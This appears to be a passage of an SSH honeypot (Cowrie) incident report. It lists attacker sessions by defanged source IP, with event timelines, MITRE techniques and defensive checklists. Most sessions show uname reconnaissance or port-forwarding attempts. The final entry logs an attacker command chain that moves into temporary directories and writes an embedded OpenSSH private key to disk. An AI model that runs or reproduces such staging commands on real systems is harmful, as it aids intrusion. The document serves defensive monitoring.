| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:42:16` | `cowrie.session.connect` |
| `2026-09-09 17:42:16` | `cowrie.client.version` |
| `2026-09-09 17:42:16` | `cowrie.client.kex` |
| `2026-09-09 17:42:16` | `cowrie.login.success` |
| `2026-09-09 17:42:17` | `cowrie.session.params` |
| `2026-09-09 17:42:17` | `cowrie.command.input` |
| `2026-09-09 17:42:17` | `cowrie.log.closed` |
| `2026-09-09 17:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb27628a7b5f

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-09 17:43 |
| **Last Seen** | 2026-09-09 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:43:01` | `cowrie.session.connect` |
| `2026-09-09 17:43:01` | `cowrie.client.version` |
| `2026-09-09 17:43:01` | `cowrie.client.kex` |
| `2026-09-09 17:43:01` | `cowrie.login.success` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:43:03` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:43:04` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 17:43:04` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-358fb70f9ff7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:43 |
| **Last Seen** | 2026-09-09 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:43:48` | `cowrie.session.connect` |
| `2026-09-09 17:43:48` | `cowrie.client.version` |
| `2026-09-09 17:43:48` | `cowrie.client.kex` |
| `2026-09-09 17:43:49` | `cowrie.login.success` |
| `2026-09-09 17:43:49` | `cowrie.session.params` |
| `2026-09-09 17:43:49` | `cowrie.command.input` |
| `2026-09-09 17:43:50` | `cowrie.log.closed` |
| `2026-09-09 17:43:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0d40cb8ffd

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-09 17:43 |
| **Last Seen** | 2026-09-09 17:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:43:58` | `cowrie.session.connect` |
| `2026-09-09 17:43:58` | `cowrie.client.version` |
| `2026-09-09 17:43:58` | `cowrie.client.kex` |
| `2026-09-09 17:43:58` | `cowrie.login.success` |
| `2026-09-09 17:44:00` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:44:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 17:44:00` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:44:02` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:44:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 17:44:02` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:44:05` | `cowrie.direct-tcpip.request` |
| `2026-09-09 17:44:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 17:44:06` | `cowrie.direct-tcpip.data` |
| `2026-09-09 17:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2b8c13df93

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:45 |
| **Last Seen** | 2026-09-09 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:45:24` | `cowrie.session.connect` |
| `2026-09-09 17:45:24` | `cowrie.client.version` |
| `2026-09-09 17:45:24` | `cowrie.client.kex` |
| `2026-09-09 17:45:25` | `cowrie.login.success` |
| `2026-09-09 17:45:25` | `cowrie.session.params` |
| `2026-09-09 17:45:25` | `cowrie.command.input` |
| `2026-09-09 17:45:26` | `cowrie.log.closed` |
| `2026-09-09 17:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6304fb7096e8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:47 |
| **Last Seen** | 2026-09-09 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:47:04` | `cowrie.session.connect` |
| `2026-09-09 17:47:04` | `cowrie.client.version` |
| `2026-09-09 17:47:05` | `cowrie.client.kex` |
| `2026-09-09 17:47:05` | `cowrie.login.success` |
| `2026-09-09 17:47:06` | `cowrie.session.params` |
| `2026-09-09 17:47:06` | `cowrie.command.input` |
| `2026-09-09 17:47:06` | `cowrie.log.closed` |
| `2026-09-09 17:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef4b704eb6ef

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:48 |
| **Last Seen** | 2026-09-09 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:48:42` | `cowrie.session.connect` |
| `2026-09-09 17:48:42` | `cowrie.client.version` |
| `2026-09-09 17:48:42` | `cowrie.client.kex` |
| `2026-09-09 17:48:42` | `cowrie.login.success` |
| `2026-09-09 17:48:43` | `cowrie.session.params` |
| `2026-09-09 17:48:43` | `cowrie.command.input` |
| `2026-09-09 17:48:43` | `cowrie.log.closed` |
| `2026-09-09 17:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a07c7b8b97

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-09 18:05 |
| **Last Seen** | 2026-09-09 18:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:05:28` | `cowrie.session.connect` |
| `2026-09-09 18:05:29` | `cowrie.client.version` |
| `2026-09-09 18:05:29` | `cowrie.client.kex` |
| `2026-09-09 18:05:30` | `cowrie.login.success` |
| `2026-09-09 18:05:30` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:05:30` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:05:30` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-231d060b2c32

| Field | Detail |
|---|---|
| **Source IP** | `43.100.100[.]9` |
| **First Seen** | 2026-09-09 18:08 |
| **Last Seen** | 2026-09-09 18:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:08:52` | `cowrie.session.connect` |
| `2026-09-09 18:08:52` | `cowrie.client.version` |
| `2026-09-09 18:08:52` | `cowrie.client.kex` |
| `2026-09-09 18:08:52` | `cowrie.login.success` |
| `2026-09-09 18:08:53` | `cowrie.session.params` |
| `2026-09-09 18:08:53` | `cowrie.command.input` |
| `2026-09-09 18:08:54` | `cowrie.log.closed` |
| `2026-09-09 18:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.100[.]9` to AbuseIPDB if not already reported
- [ ] Block `43.100.100[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894de7ea636b

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-09 18:14 |
| **Last Seen** | 2026-09-09 18:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:14:30` | `cowrie.session.connect` |
| `2026-09-09 18:14:32` | `cowrie.client.version` |
| `2026-09-09 18:14:32` | `cowrie.client.kex` |
| `2026-09-09 18:14:33` | `cowrie.login.success` |
| `2026-09-09 18:14:33` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:14:33` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:14:34` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79dac5d294c9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:19 |
| **Last Seen** | 2026-09-09 18:20 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:19:19` | `cowrie.session.connect` |
| `2026-09-09 18:19:19` | `cowrie.client.version` |
| `2026-09-09 18:19:24` | `cowrie.client.kex` |
| `2026-09-09 18:19:54` | `cowrie.login.success` |
| `2026-09-09 18:20:10` | `cowrie.session.params` |
| `2026-09-09 18:20:10` | `cowrie.command.input` |
| `2026-09-09 18:20:13` | `cowrie.log.closed` |
| `2026-09-09 18:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3182f1fb053a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:19 |
| **Last Seen** | 2026-09-09 18:20 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:19:22` | `cowrie.session.connect` |
| `2026-09-09 18:19:22` | `cowrie.client.version` |
| `2026-09-09 18:19:23` | `cowrie.client.kex` |
| `2026-09-09 18:19:52` | `cowrie.login.success` |
| `2026-09-09 18:20:01` | `cowrie.session.params` |
| `2026-09-09 18:20:01` | `cowrie.command.input` |
| `2026-09-09 18:20:21` | `cowrie.log.closed` |
| `2026-09-09 18:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4409ffbea1a4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:19 |
| **Last Seen** | 2026-09-09 18:20 |
| **Session Duration** | 79s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:19:24` | `cowrie.session.connect` |
| `2026-09-09 18:19:27` | `cowrie.client.version` |
| `2026-09-09 18:19:27` | `cowrie.client.kex` |
| `2026-09-09 18:20:28` | `cowrie.login.success` |
| `2026-09-09 18:20:38` | `cowrie.session.params` |
| `2026-09-09 18:20:38` | `cowrie.command.input` |
| `2026-09-09 18:20:43` | `cowrie.log.closed` |
| `2026-09-09 18:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1ef3276c64

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:19 |
| **Last Seen** | 2026-09-09 18:20 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:19:44` | `cowrie.session.connect` |
| `2026-09-09 18:19:44` | `cowrie.client.version` |
| `2026-09-09 18:19:54` | `cowrie.client.kex` |
| `2026-09-09 18:20:16` | `cowrie.login.success` |
| `2026-09-09 18:20:20` | `cowrie.session.params` |
| `2026-09-09 18:20:20` | `cowrie.command.input` |
| `2026-09-09 18:20:22` | `cowrie.log.closed` |
| `2026-09-09 18:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f3e0bae86f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:20 |
| **Last Seen** | 2026-09-09 18:26 |
| **Session Duration** | 355s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:20:07` | `cowrie.session.connect` |
| `2026-09-09 18:20:07` | `cowrie.client.version` |
| `2026-09-09 18:20:07` | `cowrie.client.kex` |
| `2026-09-09 18:21:03` | `cowrie.login.success` |
| `2026-09-09 18:21:04` | `cowrie.session.params` |
| `2026-09-09 18:21:04` | `cowrie.command.input` |
| `2026-09-09 18:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a05e433d948

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:20 |
| **Last Seen** | 2026-09-09 18:26 |
| **Session Duration** | 374s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:20:07` | `cowrie.session.connect` |
| `2026-09-09 18:20:07` | `cowrie.client.version` |
| `2026-09-09 18:20:11` | `cowrie.client.kex` |
| `2026-09-09 18:21:22` | `cowrie.login.success` |
| `2026-09-09 18:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1d4d600f08

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]112` |
| **First Seen** | 2026-09-09 18:20 |
| **Last Seen** | 2026-09-09 18:20 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:20:22` | `cowrie.session.connect` |
| `2026-09-09 18:20:22` | `cowrie.client.version` |
| `2026-09-09 18:20:32` | `cowrie.client.kex` |
| `2026-09-09 18:20:43` | `cowrie.login.success` |
| `2026-09-09 18:20:44` | `cowrie.session.params` |
| `2026-09-09 18:20:44` | `cowrie.command.input` |
| `2026-09-09 18:20:44` | `cowrie.log.closed` |
| `2026-09-09 18:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]112` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7952767abc9

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-09 18:21 |
| **Last Seen** | 2026-09-09 18:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:21:13` | `cowrie.session.connect` |
| `2026-09-09 18:21:14` | `cowrie.client.version` |
| `2026-09-09 18:21:15` | `cowrie.client.kex` |
| `2026-09-09 18:21:15` | `cowrie.login.success` |
| `2026-09-09 18:21:16` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:21:16` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:21:16` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea92b2d164a3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-09 18:28 |
| **Last Seen** | 2026-09-09 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:28:41` | `cowrie.session.connect` |
| `2026-09-09 18:28:41` | `cowrie.client.version` |
| `2026-09-09 18:28:41` | `cowrie.client.kex` |
| `2026-09-09 18:28:41` | `cowrie.login.success` |
| `2026-09-09 18:28:41` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:28:41` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa9c3576852

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-09 18:30 |
| **Last Seen** | 2026-09-09 18:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:30:13` | `cowrie.session.connect` |
| `2026-09-09 18:30:14` | `cowrie.client.version` |
| `2026-09-09 18:30:14` | `cowrie.client.kex` |
| `2026-09-09 18:30:15` | `cowrie.login.success` |
| `2026-09-09 18:30:15` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:30:16` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:30:16` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5b9c25f872

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]115` |
| **First Seen** | 2026-09-09 18:38 |
| **Last Seen** | 2026-09-09 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:38:08` | `cowrie.session.connect` |
| `2026-09-09 18:38:08` | `cowrie.client.version` |
| `2026-09-09 18:38:08` | `cowrie.client.kex` |
| `2026-09-09 18:38:09` | `cowrie.login.success` |
| `2026-09-09 18:38:09` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:38:09` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:38:09` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]115` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eee65760d6a

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-09 18:38 |
| **Last Seen** | 2026-09-09 18:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:38:43` | `cowrie.session.connect` |
| `2026-09-09 18:38:43` | `cowrie.client.version` |
| `2026-09-09 18:38:43` | `cowrie.client.kex` |
| `2026-09-09 18:38:44` | `cowrie.login.success` |
| `2026-09-09 18:38:45` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:38:45` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 18:38:45` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:38:45` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:38:46` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 18:38:47` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:38:47` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:38:47` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 18:38:47` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d499d9509bf7

| Field | Detail |
|---|---|
| **Source IP** | `23.88.108[.]246` |
| **First Seen** | 2026-09-09 18:47 |
| **Last Seen** | 2026-09-09 18:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:47:51` | `cowrie.session.connect` |
| `2026-09-09 18:47:51` | `cowrie.client.version` |
| `2026-09-09 18:47:51` | `cowrie.client.kex` |
| `2026-09-09 18:47:52` | `cowrie.login.success` |
| `2026-09-09 18:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.88.108[.]246` to AbuseIPDB if not already reported
- [ ] Block `23.88.108[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d465ec3636df

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-09 18:47 |
| **Last Seen** | 2026-09-09 18:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
